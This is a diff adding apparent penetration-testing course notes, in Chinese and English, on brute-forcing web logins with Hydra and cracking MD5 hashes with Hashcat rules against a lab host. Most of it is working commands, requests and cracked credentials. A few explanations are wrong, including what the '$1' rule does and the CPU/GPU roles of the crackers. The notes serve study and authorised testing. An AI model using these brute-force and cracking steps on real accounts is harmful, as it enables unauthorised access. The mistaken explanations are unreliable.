@@ -3161,3 +3161,401 @@ Password spraying 是一種暴破手法，攻擊者會對目標系統進行大�
 
 
 ### 2. HTTP POST login forms
+#### 2.1 Login page
+以 [TinyFileManager](https://github.com/prasathmani/tinyfilemanager) 為例，透過 Open source 可以得知有兩組預設帳號密碼： `amdin` & `user`
+![image](https://hackmd.io/_uploads/ByB0kNvF1l.png)\
+
+request:
+```
+POST / HTTP/1.1
+Host: 192.168.230.201
+Content-Length: 25
+Cache-Control: max-age=0
+Accept-Language: zh-TW
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.230.201
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.230.201/
+Accept-Encoding: gzip, deflate, br
+Cookie: filemanager=831mv2t09ma1h2ef3urp9oe13r
+Connection: keep-alive
+
+fm_usr=user&fm_pwd=user
+```
+![image](https://hackmd.io/_uploads/HJNKgNDtJl.png)\
+透過 Error message 讓 hydra 判斷是否成功，並帶上 http-post-form argument:\
+`Login failed. Invalid username or password`
+
+```
+CWei@CHW-MacBook-Pro wordlist % hydra -l user -P rockyou.txt 192.168.230.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login
+ failed. Invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-10 16:03:21
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.230.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid
+[STATUS] 32.00 tries/min, 32 tries in 00:01h, 14344366 to do in 7471:02h, 16 active
+[STATUS] 32.00 tries/min, 96 tries in 00:03h, 14344302 to do in 7470:60h, 16 active
+[80][http-post-form] host: 192.168.230.201   login: user   password: 121212
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-10 16:08:23
+```
+> 1. `fm_usr=admin&fm_pwd=^PASS^`:
+fm_usr=admin：帳號固定為 admin\
+fm_pwd=^PASS ^：密碼部分, Hydra 會依照 rockyou.txt 內容替換。
+> 2. `Login failed. Invalid`: 將 error message 作為判斷基準
+>> **[80][http-post-form] host: 192.168.230.201   login: user   password: 121212**
+
+>[!note]
+> 若 Server 環境有 WAF 或 [fail2ban](https://github.com/fail2ban/fail2ban)，無法用暴力破解
+
+#### 2.2 web page is password protected
+![image](https://hackmd.io/_uploads/Hk_6PEDYJe.png)
+
+request 使用了 Basic Authentication，
+```
+GET / HTTP/1.1
+Host: 192.168.230.201
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46YWRtaW4=
+Accept-Language: zh-TW
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: filemanager=2k1ko9c196gp71td42h734d31e
+Connection: keep-alive
+```
+> `Authorization: Basic YWRtaW46YWRtaW4=` 是 Base64 編碼後的 admin:admin
+
+因為 Basic Authentication 會影響整個網頁路徑，所以直接瀏覽根目錄就可
+```
+CWei@CHW-MacBook-Pro wordlist % hydra -l admin -P rockyou.txt 192.168.230.201 http-get "/"
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-10 16:21:02
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-get://192.168.230.201:80/
+[80][http-get] host: 192.168.230.201   login: admin   password: 789456
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-10 16:21:17
+```
+> **[80][http-get] host: 192.168.230.201   login: admin   password: 789456**
+
+## Password Cracking Fundamentals
+### Encryption, Hashes and Cracking
+1. Differences between encryption and hash algorithms
+    (1) Encryption is a two-way function: `scrambled (encrypted)` or `unscrambled (decrypted)`
+    - Symmetric encryption: 使用相同的金鑰，雙方都需要知道密鑰
+        - Attacker: Man-in-the-middle attack
+        - [Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) (AES)
+    - Asymmetric encryption: 包含私鑰和公鑰，每個 user 都有自己的密鑰，當 user 要接收加密訊息，需要將其公鑰提供給 communication partner
+        - [Rivest–Shamir–Adleman](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) (RSA)
+    
+    (2) Hash (or digest) is the result of running variable-sized input data through a hash algorithm (such as [SHA1](https://en.wikipedia.org/wiki/SHA-1) or [MD5](https://en.wikipedia.org/wiki/MD5)), The password is often hashed and stored in a database
+    - Result: 唯一的固定長度的十六進制
+    - extremely rare [hash collision (哈希衝突)](https://en.wikipedia.org/wiki/Hash_collision)
+    - one-way functions:MD5 and SHA1
+    - keyspace: 
+        - 假設 大小寫英文字母 (52 characters) & 數字 (10 characters)，每個字元就有 62 種可能的變體
+            - 若一個 五個字元的密碼: `python3 -c "print(62**5)": 916132832` (916132832 種可能)
+
+2. password cracking
+Take a considerable amount of time\
+```
+┌──(chw㉿CHW)-[~]
+└─$ echo -n "secret" | sha256sum
+2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
+
+┌──(chw㉿CHW)-[~]
+└─$ echo -n "secret" | sha256sum
+2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
+
+┌──(chw㉿CHW)-[~]
+└─$ echo -n "secret1" | sha256sum
+5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
+```
+> 可以看出一樣的字串經過 hash 結果會一樣。相近的字串經過 hash 後會完全不同
+
+- [Hashcat](https://hashcat.net/hashcat/)
+    - 基於CPU的破解工具，同時也支援GPU
+    - 不需要附加驅動
+- [John the Ripper (JtR)](https://www.openwall.com/john/)
+    - 基於GPU的破解工具，同時也支援CPU
+    - 需要 [OpenCL](https://en.wikipedia.org/wiki/OpenCL) 或 [CUDA](https://developer.nvidia.com/cuda-toolkit)
+
+```
+CWei@CHW-MacBook-Pro ~ % hashcat -b
+hashcat (v6.2.6) starting in benchmark mode
+
+Benchmarking uses hand-optimized kernel code by default.
+You can use it in your cracking session by setting the -O option.
+Note: Using optimized kernel code limits the maximum supported password length.
+To disable the optimized kernel code in benchmark mode, use the -w option.
+
+* Device #2: Apple's OpenCL drivers (GPU) are known to be unreliable.
+             You have been warned.
+
+METAL API (Metal 367.6)
+=======================
+* Device #1: Apple M3, 8160/16384 MB, 10MCU
+
+OpenCL API (OpenCL 1.2 (Dec 13 2024 23:09:21)) - Platform #1 [Apple]
+====================================================================
+* Device #2: Apple M3, skipped
+
+Benchmark relevant options:
+===========================
+* --optimized-kernel-enable
+
+-------------------
+* Hash-Mode 0 (MD5)
+-------------------
+
+Speed.#1.........:  3268.4 MH/s (101.74ms) @ Accel:1024 Loops:256 Thr:128 Vec:1
+
+----------------------
+* Hash-Mode 100 (SHA1)
+----------------------
+
+Speed.#1.........:   911.7 MH/s (90.38ms) @ Accel:256 Loops:1024 Thr:32 Vec:1
+
+---------------------------
+* Hash-Mode 1400 (SHA2-256)
+---------------------------
+
+Speed.#1.........:   536.3 MH/s (77.45ms) @ Accel:32 Loops:1024 Thr:128 Vec:1
+```
+![image](https://hackmd.io/_uploads/SJAvUSPKkl.png)
+
+根據 offsec 實驗， GPU 需要大約 6.5 小時來嘗試八個字元密碼的所有可能組合，GPU 需要大約 2.8年來嘗試十個字元密碼的所有可能組合。
+
+### Mutating Wordlists
+密碼通常有最小長度以及大寫和小寫字母、特殊字元和數字的組合\
+👉🏻 [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
+
+以下建立 rule function，透過 function 自動更改(or mutating)，讓 wordlist 符合密碼規則:
+1. 將 rockyou.txt 前 10 個 密碼，複製到 passwordattacks/demo.txt 當作範例
+```
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# head rockyou.txt      
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# mkdir passwordattacks && head rockyou.txt > passwordattacks/demo.txt
+```
+2. 刪除 demo.txt 中以數字 1 開頭的行
+```
+┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
+└─# sed -i '/^1/d' demo.txt
+
+┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
+└─# cat demo.txt      
+password
+iloveyou
+princess
+rockyou
+abc123
+```
+> 使用 `-i` 進行編輯，`d`刪除\
+> `/^1/`：正則表達式，匹配以 1 開頭的
+
+假設 password policy 要求 必須包含一個數值、一個特殊字元和一個大寫字母\
+[Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack) 提供 rule functions 可以使用
+
+3. 建立 rule functions
+假設需要以數字1開頭，並且有大寫字母
+>[!note]
+> rule 會識別單獨的行\
+> ex.1 透過空白間隔指的是 **將第一個字母轉換成大寫**
+> ```
+>┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
+>└─# cat demo1.rule     
+>$1 c      
+>┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
+>└─# hashcat -r demo1.rule --stdout demo.txt
+>Password1
+>Iloveyou1
+>Princess1
+>Rockyou1
+>Abc1231
+> ```
+> ex.2 透過換行指的是兩個規則 **字元後面＋1與將第一個字母轉換成大寫**
+> ```
+>┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
+>└─#cat demo2.rule   
+>$1
+>c
+>┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
+>└─# hashcat -r demo2.rule --stdout demo.txt
+>password1
+>Password
+>iloveyou1
+>Iloveyou
+>princess1
+>Princess
+>...
+> ```
+
+4. Hashcat 爆破
+範例要求 加入最常見 (ever-popular) "1", "2", and "123" 和特殊字元！\
+使用 Hash (crackme.tx) 作為爆破目標
+```
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# cat demo.rule                                            
+$1 c $!
+$2 c $!
+$1 $2 $3 c $!                                                                       
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# cat crackme.txt                                          
+f621b6c9eab51a3e2f4e167fee4c6860
+
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# hashcat -m 0 crackme.txt rockyou.txt -r demo.rule --show 
+f621b6c9eab51a3e2f4e167fee4c6860:Computer123!
+
+```
+
+> 1. $1 c $!
+>`$1`：取密碼的 第一個字母\
+>`c`：將該字母轉為 大寫\
+>`$!``：在密碼後面加上 !
+> 2. $2 c $!
+>`$2`：取密碼的 第二個字母\
+>`c`：將該字母轉為 大寫\
+>`$!`：在密碼後面加上 !
+>3. $1 $2 $3 c $!
+>`$1 $2 $3`：取密碼的 前三個字母
+>`c`：將這三個字母轉為 大寫
+>`$!`：在密碼後面加上 !
+
+>[!Important]
+> Hashcat 有官方 rule files：
+> ```
+>┌──(root㉿CHW)-[/usr/share/wordlists]
+>└─# ls -al ../hashcat/rules 
+>total 2860
+>drwxr-xr-x 3 root root   4096 Feb  3 04:16 .
+>drwxr-xr-x 9 root root   4096 Feb  3 04:16 ..
+>-rw-r--r-- 1 root root 309439 Apr 24  2024 Incisive-leetspeak.rule
+>-rw-r--r-- 1 root root  35802 Apr 24  2024 InsidePro-HashManager.rule
+>-rw-r--r-- 1 root root  20580 Apr 24  2024 InsidePro-PasswordsPro.rule
+>-rw-r--r-- 1 root root  64068 Apr 24  2024 T0XlC-insert_00-99_1950->2050_toprules_0_F.rule
+>-rw-r--r-- 1 root root   2027 Apr 24  2024 T0XlC->insert_space_and_special_0_F.rule
+>-rw-r--r-- 1 root root  34437 Apr 24  2024 T0XlC->insert_top_100_passwords_1_G.rule
+>-rw-r--r-- 1 root root  34813 Apr 24  2024 T0XlC.rule
+>-rw-r--r-- 1 root root   1289 Apr 24  2024 T0XlC_3_rule.rule
+>-rw-r--r-- 1 root root 168700 Apr 24  2024 >T0XlC_insert_HTML_entities_0_Z.rule
+>-rw-r--r-- 1 root root 197418 Apr 24  2024 T0XlCv2.rule
+>-rw-r--r-- 1 root root    933 Apr 24  2024 best64.rule
+>-rw-r--r-- 1 root root    754 Apr 24  2024 combinator.rule
+>-rw-r--r-- 1 root root 200739 Apr 24  2024 d3ad0ne.rule
+>-rw-r--r-- 1 root root 788063 Apr 24  2024 dive.rule
+>-rw-r--r-- 1 root root  78068 Apr 24  2024 generated.rule
+>-rw-r--r-- 1 root root 483425 Apr 24  2024 generated2.rule
+>drwxr-xr-x 2 root root   4096 Feb  3 04:16 hybrid
+> ```
+
+Example: You extracted the MD5 hash "19adc0e8921336d08502c039dc297ff8" from a target system. Create a rule which makes all letters upper case and duplicates the passwords contained in rockyou.txt and crack the hash.
+
+Ans: 
+```
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# cat demo.rule
+u d
+                                                                             
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# hashcat -m 0 19adc0e8921336d08502c039dc297ff8 rockyou.txt -r demo.rule --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU
+...
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+19adc0e8921336d08502c039dc297ff8:BUTTERFLY5BUTTERFLY5     
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 19adc0e8921336d08502c039dc297ff8
+...
+Hardware.Mon.#1..: Util: 35%
+
+Started: Tue Feb 11 02:11:23 2025
+Stopped: Tue Feb 11 02:11:25 2025
+
+```
+> BUTTERFLY5BUTTERFLY5
+
+### Cracking Methodology
+identify the hash type with:
+- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
+```
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# hash-identifier 19adc0e8921336d08502c039dc297ff8                              
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+
+Possible Hashs:
+[+] MD5
+[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+
+Least Possible Hashs:
+...
+```
+- [hashid](https://www.kali.org/tools/hashid/)
+```
+┌──(root㉿CHW)-[/usr/share/wordlists]
+└─# hashid 19adc0e8921336d08502c039dc297ff8  
+Analyzing '19adc0e8921336d08502c039dc297ff8'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+...
+```
+
+### Password Manager
+popular password managers include [1Password](https://1password.com/) and [KeePass](https://keepass.info/).
+
+Pentest 中，假設已經獲得密碼管理器的 client 的存取權限，將提取密碼管理器的資料庫，將檔案轉換為與 Hashcat 相容的格式，再破解主資料庫密碼
